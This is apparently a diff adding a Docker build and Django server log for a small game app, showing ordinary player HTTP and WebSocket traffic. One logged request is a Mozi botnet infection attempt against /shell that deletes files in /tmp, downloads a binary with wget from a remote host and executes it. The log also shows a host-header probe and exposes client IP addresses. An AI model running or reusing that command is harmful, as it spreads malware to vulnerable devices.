@@ -1,0 +1,111 @@
+Step 1/6 : FROM python:3.8-slim-buster
+ ---> 5be55fb2aad1
+Step 2/6 : WORKDIR /app
+ ---> Using cache
+ ---> b53bc60b3ad2
+Step 3/6 : COPY requirements.txt requirements.txt
+ ---> Using cache
+ ---> 2c7e56dd8d75
+Step 4/6 : RUN pip3 install -r requirements.txt
+ ---> Using cache
+ ---> 01da7c88c1bf
+Step 5/6 : COPY . .
+ ---> Using cache
+ ---> 4a0c96943e83
+Step 6/6 : CMD [ "python3", "manage.py", "runserver", "0.0.0.0:80"]
+ ---> Using cache
+ ---> 3ad0c415fc59
+
+Successfully built 3ad0c415fc59
+Successfully tagged app:juego
+Attaching to juego_container
+[36mjuego_container |[0m Watching for file changes with StatReloader
+[36mjuego_container |[0m HTTP GET / 200 [0.04, 89.29.186.21:60967]
+[36mjuego_container |[0m HTTP GET /static/css/main.css 304 [0.01, 89.29.186.21:60967]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:60967]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:60967]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:60967]
+[36mjuego_container |[0m HTTP POST / 302 [0.01, 89.29.186.21:60967]
+[36mjuego_container |[0m HTTP GET /play/da?&choice=X 200 [0.01, 89.29.186.21:60967]
+[36mjuego_container |[0m HTTP GET /static/js/game.js 200 [0.01, 89.29.186.21:60967]
+[36mjuego_container |[0m WebSocket HANDSHAKING /ws/play/da/ [89.29.186.21:49690]
+[36mjuego_container |[0m WebSocket CONNECT /ws/play/da/ [89.29.186.21:49690]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 213.55.244.138:24084]
+[36mjuego_container |[0m HTTP GET /static/css/main.css 200 [0.00, 213.55.244.138:24084]
+[36mjuego_container |[0m Not Found: /favicon.ico
+[36mjuego_container |[0m HTTP GET /favicon.ico 404 [0.05, 213.55.244.138:24084]
+[36mjuego_container |[0m HTTP POST / 302 [0.01, 213.55.244.138:24084]
+[36mjuego_container |[0m HTTP GET /play/Monadical?&choice=X 200 [0.01, 213.55.244.138:24084]
+[36mjuego_container |[0m HTTP GET /static/js/game.js 200 [0.00, 213.55.244.138:24084]
+[36mjuego_container |[0m WebSocket HANDSHAKING /ws/play/Monadical/ [213.55.244.138:24104]
+[36mjuego_container |[0m WebSocket CONNECT /ws/play/Monadical/ [213.55.244.138:24104]
+[36mjuego_container |[0m WebSocket DISCONNECT /ws/play/Monadical/ [213.55.244.138:24104]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 186.86.52.177:11467]
+[36mjuego_container |[0m HTTP GET /static/css/main.css 200 [0.00, 186.86.52.177:11467]
+[36mjuego_container |[0m Not Found: /favicon.ico
+[36mjuego_container |[0m HTTP GET /favicon.ico 404 [0.01, 186.86.52.177:11467]
+[36mjuego_container |[0m HTTP POST / 302 [0.01, 186.86.52.177:11467]
+[36mjuego_container |[0m HTTP GET /play/111111?&choice=X 200 [0.01, 186.86.52.177:11467]
+[36mjuego_container |[0m HTTP GET /static/js/game.js 200 [0.00, 186.86.52.177:11467]
+[36mjuego_container |[0m WebSocket HANDSHAKING /ws/play/111111/ [186.86.52.177:9584]
+[36mjuego_container |[0m WebSocket CONNECT /ws/play/111111/ [186.86.52.177:9584]
+[36mjuego_container |[0m HTTP GET /play/111111?&choice=X 200 [0.01, 186.86.52.177:4267]
+[36mjuego_container |[0m HTTP GET /static/css/main.css 200 [0.00, 186.86.52.177:4267]
+[36mjuego_container |[0m HTTP GET /static/js/game.js 200 [0.01, 186.86.52.177:4268]
+[36mjuego_container |[0m WebSocket HANDSHAKING /ws/play/111111/ [186.86.52.177:4269]
+[36mjuego_container |[0m WebSocket CONNECT /ws/play/111111/ [186.86.52.177:4269]
+[36mjuego_container |[0m Not Found: /play/111111
+[36mjuego_container |[0m HTTP GET /play/111111?&choice=o 404 [0.01, 186.86.52.177:4268]
+[36mjuego_container |[0m WebSocket DISCONNECT /ws/play/111111/ [186.86.52.177:4269]
+[36mjuego_container |[0m HTTP GET /play/111111?&choice=O 200 [0.01, 186.86.52.177:4268]
+[36mjuego_container |[0m WebSocket HANDSHAKING /ws/play/111111/ [186.86.52.177:4272]
+[36mjuego_container |[0m WebSocket CONNECT /ws/play/111111/ [186.86.52.177:4272]
+[36mjuego_container |[0m WebSocket DISCONNECT /ws/play/111111/ [186.86.52.177:4272]
+[36mjuego_container |[0m WebSocket DISCONNECT /ws/play/111111/ [186.86.52.177:9584]
+[36mjuego_container |[0m Not Found: /shell
+[36mjuego_container |[0m HTTP GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 404 [0.02, 178.72.68.190:22845]
+[36mjuego_container |[0m Invalid HTTP_HOST header: 'www.99syn.com'. You may need to add 'www.99syn.com' to ALLOWED_HOSTS.
+[36mjuego_container |[0m Bad Request: https://www.99syn.com/index.html
+[36mjuego_container |[0m HTTP GET https://www.99syn.com/index.html 400 [0.08, 103.195.101.218:45890]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 23.146.241.135:59002]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 128.1.248.42:47364]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 87.140.41.144:55515]
+[36mjuego_container |[0m HTTP GET /play/da?&choice=X 200 [0.01, 89.29.186.21:61645]
+[36mjuego_container |[0m WebSocket DISCONNECT /ws/play/da/ [89.29.186.21:49690]
+[36mjuego_container |[0m HTTP GET /static/css/main.css 304 [0.00, 89.29.186.21:61645]
+[36mjuego_container |[0m HTTP GET /static/js/game.js 304 [0.00, 89.29.186.21:61645]
+[36mjuego_container |[0m WebSocket HANDSHAKING /ws/play/da/ [89.29.186.21:50152]
+[36mjuego_container |[0m WebSocket CONNECT /ws/play/da/ [89.29.186.21:50152]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:61645]
+[36mjuego_container |[0m WebSocket DISCONNECT /ws/play/da/ [89.29.186.21:50152]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:61663]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:61663]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:61663]
+[36mjuego_container exited with code 0
+[0mStep 1/6 : FROM python:3.8-slim-buster
+ ---> 5be55fb2aad1
+Step 2/6 : WORKDIR /app
+ ---> Using cache
+ ---> b53bc60b3ad2
+Step 3/6 : COPY requirements.txt requirements.txt
+ ---> Using cache
+ ---> 2c7e56dd8d75
+Step 4/6 : RUN pip3 install -r requirements.txt
+ ---> Using cache
+ ---> 01da7c88c1bf
+Step 5/6 : COPY . .
+ ---> Using cache
+ ---> 4a0c96943e83
+Step 6/6 : CMD [ "python3", "manage.py", "runserver", "0.0.0.0:80"]
+ ---> Using cache
+ ---> 3ad0c415fc59
+
+Successfully built 3ad0c415fc59
+Successfully tagged app:juego
+Attaching to juego_container
+[36mjuego_container |[0m Watching for file changes with StatReloader
+[36mjuego_container |[0m HTTP GET / 200 [0.05, 89.29.186.21:50182]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:50182]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:50182]
+[36mjuego_container |[0m HTTP GET / 200 [0.01, 89.29.186.21:62121]
+[36mjuego_container |[0m HTTP GET /static/css/main.css 304 [0.01, 89.29.186.21:62121]
